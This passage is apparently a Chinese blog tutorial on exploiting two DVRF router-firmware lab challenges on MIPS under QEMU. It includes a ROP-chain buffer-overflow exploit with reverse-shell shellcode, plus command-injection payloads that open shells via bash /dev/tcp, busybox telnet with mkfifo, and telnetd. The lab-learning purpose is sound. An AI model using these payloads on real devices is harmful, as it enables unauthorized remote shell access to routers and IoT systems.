    comm_fd = accept(listen_fd, (struct sockaddr*) NULL, NULL);
    bzero(str, 500);
    write(comm_fd, "Send Me Bytes:",14);
    read(comm_fd,str,500);
    sprintf(endstr, "nom nom nom, you sent me %s", str);
    printf("Sent back - %s",str);
    write(comm_fd, endstr, strlen(endstr)+1);
    shutdown(comm_fd, SHUT_RDWR);
    shutdown(listen_fd, SHUT_RDWR);
    close(comm_fd);
    close(listen_fd);
    return 0x42;
`}`
```

这道题目和之前的区别就是，接收的信息，从原来的程序输入，变成了网络输入，这就和ctf题目非常类似，漏洞点出现在`sprintf(endstr, "nom nom nom, you sent me %s", str);`，这个里面`endstr`是一个只有50个字节长度的字符数组，但是要把`str`这个500个字符的数组拷贝进去，所以就造成了溢出，并且`str`的内容来自于socket的输入。

### <a class="reference-link" name="%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"></a>查看文件

[![](https://p4.ssl.qhimg.com/t01120153caf030c780.png)](https://p4.ssl.qhimg.com/t01120153caf030c780.png)

### <a class="reference-link" name="IDA%E6%9F%A5%E7%9C%8B"></a>IDA查看

[![](https://p1.ssl.qhimg.com/t01e5dfb83f3a7164df.png)](https://p1.ssl.qhimg.com/t01e5dfb83f3a7164df.png)

这里可以看到，就是在`snprintf`的时候没有检查长度，导致的栈溢出。

### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F%E3%80%81%E8%B0%83%E8%AF%95"></a>本地模拟、调试

其实这道题目和上面的rop链很像，就是在调试的过程和上面发生了变化，我这里主要把调试过程说一下。

1.先编写启动脚本：

```
#! /bin/sh
PORT="1234"
cp $(which qemu-mipsel-static) ./qemu
./qemu -L ./ -g $PORT ./pwnable/ShellCode_Required/socket_bof 9999
rm qemu
```

2.gdb调试

```
gdb-multiarch ./pwnable/ShellCode_Required/socket_bof
target remote 127.0.0.1:1234
b *0x400E28
c
```

3.exp.py

```
from pwn import *
context.endian = "little"
context.arch = "mips"
p = remote('127.0.0.1',9999)
p.recvuntil('Send Me Bytes:')
data = "xxxx"
p.sendline(data)
p.interactive()
```

我们在exp上面的data中填充进我们想要的内容就可以，以上就是调试的过程。我们还是根据确定偏移，构造rop，填充shellcode的，寻找libc基地址的流程来进行，详细的exp如下：

```
from pwn import *
context.endian = "little"
context.arch = "mips"
#port：31337
shellcode = ""
shellcode += "x26x40x08x01"*5
shellcode += "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
shellcode += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
shellcode += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
shellcode += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
shellcode += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
shellcode += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
shellcode += "xf8xffxa5xafx64xfex05x3cxc0xa8xa5x34xfcxffxa5xaf"           # 192.168.100.254(这个里面改为自己的本机ip地址，也就是x64fe和xc0xa8改为自己相应的ip)
shellcode += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
shellcode += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
shellcode += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
shellcode += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
shellcode += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
shellcode += "xabx0fx02x24x0cx09x09x01"
gadget0 = 0x2fb10
gadget1 = 0x6A50
gadget2 = 0x20F1C 
gadget3 = 0x16DD0
gadget4 = 0x214A0 
libc_base = 0x77ee2000
#libc_base = 0x766e5000
sleep_offset = 0x2F2B0
data = "a"*51
data += p32(gadget1+libc_base)
data += "b"*0x58
data += "bbbb" #s0
data += p32(gadget2+libc_base) #s1
data += p32(sleep_offset+libc_base) #s2
data += p32(gadget0+libc_base)
data +="c"*0x18
data += p32(gadget4+libc_base) #s0
data += "cccc" #s1
data += "cccc" #s2
data += p32(gadget3+libc_base) #ra
data += "d"*0x18
data += shellcode
p = remote('127.0.0.1',9999)
p.recvuntil('Send Me Bytes:')
p.sendline(data)
p.interactive()
```

运行成功的流程为分别在三个窗口执行下面的三条指令：

```
nc -lvp 31337
./local.sh
python exp.py
```

成功返回shell的图片如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016773dc90fe438471.png)

### <a class="reference-link" name="qemu%E6%A8%A1%E6%8B%9F%E8%B0%83%E8%AF%95"></a>qemu模拟调试

qemu里面模拟的过程，

1.可以安装上面两道题的方式进行调试。

2.还可以按照下面的方式来进行：

1）在qemu中

```
chroot . ./pwnable/ShellCode_Required/socket_bof 9999 &amp;
gdbserver.mipsel 192.169.100.254:6666 --attach pid
```

如图所示：

[![](https://p2.ssl.qhimg.com/t0135e19ec0288d9098.png)](https://p2.ssl.qhimg.com/t0135e19ec0288d9098.png)

2)在本机中运行

```
gdb-multiarch
target remote 192.168.100.3:6666
vmmap
c
```

如图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012db6490909a61d4d.png)

由此我们可以知道libc的基地址

3）exp.py就是上面的，把libc_base改一下，remote的ip改一下。

4）在调试过程中，nc监听的端口总是接受不了到返回的shell，总是出现如图所示的内容影响，必须在调试到shellcode最后的时候，在监听端口的话，会返回shell。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0126ef5c3c1a0b3ea6.png)

5）正常运行，不进行调试的时候，成功如图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0101edf51afc7ffaa7.png)

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

其实就是在qemu里面调试的时候会出现各种问题，例如gab-multiarch后面加不加程序路径，差异还是挺大的，总之就是多尝试一下。

## socket_cmd

这道题目涉及到了简单的命令注入的绕过。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

首先查看一下源码：

```
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
// Pwnable Socket Program
// By b1ack0wl
// Command Injection
int main(int argc, char **argv[])
`{`
    if (argc &lt;2)
    `{`
    printf("Usage: %s port_number - by b1ack0wln", argv[0]);
    exit(1);
    `}`

    char str[200] = "";
    char endstr[100] = "";
    int listen_fd, comm_fd;
    int retval = 0;
    struct sockaddr_in servaddr;
    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    bzero( &amp;servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htons(INADDR_ANY);
    servaddr.sin_port = htons(atoi(argv[1]));
    printf("Binding to port %dn", atoi(argv[1]));
    retval = bind(listen_fd, (struct sockaddr *) &amp;servaddr, sizeof(servaddr));
    if (retval == -1)
    `{`
        printf("Error Binding to port %dn", atoi(argv[1]) );
         exit(1);
     `}` 
     listen(listen_fd, 2);
     comm_fd = accept(listen_fd, (struct sockaddr*) NULL, NULL);
     while(1)
     `{`
         bzero(str, 200);
         write(comm_fd, "Send me a string:",17);
         read(comm_fd,str,200);
         if (!strcasecmp(str, "exit"))
         `{`
             write(comm_fd, "Exiting...");
             exit(0);
        `}`
        snprintf(endstr, sizeof(endstr), "echo %s", str);
        system(endstr);
        bzero(endstr, 100);
        snprintf(endstr, sizeof(endstr), "You sent me %s", str);
        write(comm_fd, endstr, strlen(endstr)+1);
    `}`
`}`
```

从代码中可以得知，我们从socket中接收一个200字符长度的字符串，然后判断一下是否是`exit`,如果不是的话，就将其放入到`endstr`中，然后用system执行。

### <a class="reference-link" name="%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"></a>查看文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0122e66741b7a45fdf.png)

得知这是一个mips 32位小端的程序，并且什么防护也没有开。

### <a class="reference-link" name="IDA%E6%9F%A5%E7%9C%8B"></a>IDA查看

我们将程序放入到IDA中查看，可以看到

[![](https://p0.ssl.qhimg.com/t0109d6515440a9dc50.png)](https://p0.ssl.qhimg.com/t0109d6515440a9dc50.png)

### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F%E3%80%81%E8%B0%83%E8%AF%95"></a>本地模拟、调试

1.我们接下来就是让程序跑起来，首先我们先进行本地模拟。我们首先写一个调试启动脚本,`gedit local.sh`如下：

```
#! /bin/sh
PORT="1234"
cp $(which qemu-mipsel-static) ./qemu
./qemu -L ./ -g $PORT ./pwnable/ShellCode_Required/socket_cmd 9999
rm qemu
```

然后我们就相当于可以在本地进行模拟，并且我们用qemu本身的gdbserver，也就是`-g`选项开启了一个调试端口`1234`。

2.接下来我们用`gdb-multiarch`进行调试，调试的命令如下：

```
gdb-multiarch ./pwnable/ShellCode_Required/socket_cmd
target remote 127.0.0.1:1234
```

我们就进入到了如图所示的调试界面。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ff0763a5257973c0.png)

然后我们在IDA中可以看到

`.text:00400CF0                 jalr    $t9 ; system`

我们将断点下到这，`b *0x400cf0`，然后`c`执行，等待来自9999端口的输入。

3.我们编写利用脚本，`vi cmdexp.py`，脚本如下：

```
from pwn import *
p=remote("127.0.0.1",1234)
p.recvuntil("Send me a string:")
payload = "123|ls"
p.sendline(payload)
p.interactive()
```

我们运行脚本，看到在模拟端成功的返回了`ls`的结果，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01baf88b3416dd5c1b.png)

4.看到这，我们就想着既然能够执行命令了，那么最好是返回一个shell,我们就想到直接用

`bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1`

然后运行，发现没有反弹shell，我们用gdb调试的时候，可以看到

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014953db78aa84141b.png)

但是并没有返回shell，目前不知道原因。

然后看其他的大佬的exp，把注入的命令改为

`123;bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'`

这样的话，就成功的返回了shell。

### <a class="reference-link" name="qemu%E6%A8%A1%E6%8B%9F"></a>qemu模拟

接下来我们进行qemu的模拟。

1.首先我们启动qemu，因为是mips小端，所以我们用如下的启动脚本start.sh和net.sh的脚本用来网络连接，并且在qemu里面运行net.sh脚本，进行网络配置，随后在qemu中运行net.sh脚本，从而配置网络ip地址，使两边能互通。

2.我们将解包完的系统拷贝到qemu中：

```
scp -r _DVRF_v03.bin.extracted root@192.168.100.3:/root/
```

3.我们开始模拟运行，并进行调试：

```
cd _DVRF_v03.bin.extracted/squashfs-root
chroot . ./pwnable/ShellCode_Required/socket_cmd 9999 &amp;
../../gdbserver.mipsel 192.169.100.254:6666 --attach 1000
```

出现如图所示的界面：

[![](https://p1.ssl.qhimg.com/t01e6d82ded48504585.png)](https://p1.ssl.qhimg.com/t01e6d82ded48504585.png)

说明gdbserver成功attach上，然后我们在本机运行：

```
gdb-multiarch
target remote 192.168.100.3:6666
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010094c1a89c0af41d.png)

然后我们接着下断点到0x400CF0，执行在本地调通的脚本，将`ip`和`port`修改一下，看system执行的命令,

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01371b9864841732ba.png)

可以看到确实是执行的我们输入的命令，但是在qemu端提示：bash not found，说明本地并没有bash指令。

4.我们接下来修改一下利用脚本，主要目的是利用固件中已有的指令去反弹shell。我们首先用busybox查看一下支持哪些指令，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0198eeca9d204bead9.png)

可以看到这个里面用到了telnet，telnetd，mkfifo等指令，所以我们可以利用`telnet+mkfifo`来反弹一个shell或者用`telnetd`，下面将分别讲解

1）反弹shell

我们将利用代码改为

```
payload = "123;TF=/tmp/sh;busybox mkfifo $TF;busybox telnet 192.168.100.254 12345 0&lt;$TF|/bin/sh 1&gt;$TF"
```

这样的话，我们在本地运行`nc -lvp 12345`，这样的话，我们就能接收到反弹回来的shell，完整的利用代码如下：

```
from pwn import *
p = remote("192.168.100.3",9999)
p.recvuntil("Send me a string:")
payload = "123;TF=/tmp/sh;busybox mkfifo $TF;busybox telnet 192.168.100.254 12345 0&lt;$TF|/bin/sh 1&gt;$TF"
p.sendline(payload)
p.interactive()
```

2）正向监听端口

我们将代码改为

```
payload = "123;TF=/tmp/sh;busybox mkfifo $TF;busybox telnetd -l /bin/sh"
```

然后我们正向连接，并没有成功，不知道原因。

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

之前的分析都是从有源码之后分析的，现在从IDA中无源码分析，感觉会对以后的IOT设备漏洞挖掘有帮助。

首先我们知道这是一个命令执行，我们先搜索`system`函数，看交叉引用，我们可以得到这就只有一个

[![](https://p1.ssl.qhimg.com/t01184f8a3ad423333f.png)](https://p1.ssl.qhimg.com/t01184f8a3ad423333f.png)

我们跳到这，就看到下面IDA中所展现的内容：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018bf8f875d30a0517.png)

我们根据途中所示的步骤，可以看跟踪到`system`的参数来自于socket的`read`中。



## 大总结

根据DVRF先初步入门了路由器的调试，但是没有设备真的是难受，以后会持续跟新一些真实路由器漏洞的浮现及调试情况，希望能对大家有点帮助，也是对自己学习的督促，加油。
